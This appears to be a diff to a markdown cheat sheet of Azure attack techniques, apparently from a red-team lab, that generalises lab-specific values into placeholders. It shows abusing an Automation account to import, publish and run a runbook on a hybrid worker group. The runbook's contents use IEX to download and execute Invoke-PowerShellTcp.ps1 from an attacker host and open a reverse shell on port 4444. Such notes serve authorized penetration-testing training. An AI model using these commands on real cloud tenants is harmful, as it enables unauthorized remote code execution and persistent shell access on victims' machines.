@@ -94,7 +94,8 @@ Connect-AzAccount -AccessToken $accesstoken -GraphAccessToken $aadtoken -Account
 
 #### Get the role assigned of the automation accounts
 - Check for the Roledefinition
-- Get the ID from ```az automation account list```
+- Get the ID from az automation account list
+
 ````
 Get-AzRoleAssignment -Scope <ID>
 ```
@@ -111,19 +112,19 @@ Import-AzAutomationRunbook -Name student38 -Path <PATH TO .ps1 FILE> -Automation
 
 #### Contents off studentx.ps1 for reverse shell
 ```
-IEX (New-Object Net.Webclient).downloadstring("http://172.16.150.38:82/Invoke-PowerShellTcp.ps1")
+IEX (New-Object Net.Webclient).downloadstring("http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1")
 
-reverse -Reverse -IPAddress 172.16.150.38 -Port 4444
+reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4444
 ```
 
 #### Publish the automation runbook to the vm
 ```
-Publish-AzAutomationRunbook -RunbookName student38 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+Publish-AzAutomationRunbook -RunbookName <NAME FOR RUNBOOK> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
 ```
 
 #### Start the runbook
 ```
-Start-AzAutomationRunbook -RunbookName student38 -RunOn Workergroup1 -AutomationAccountName HybridAutomation -ResourceGroupName Engineering -Verbose
+Start-AzAutomationRunbook -RunbookName <NAME OF RUNBOOK> -RunOn <WORK GROUP> -AutomationAccountName <NAME> -ResourceGroupName <NAME> -Verbose
 ```
 
 ## Command execution on a VM
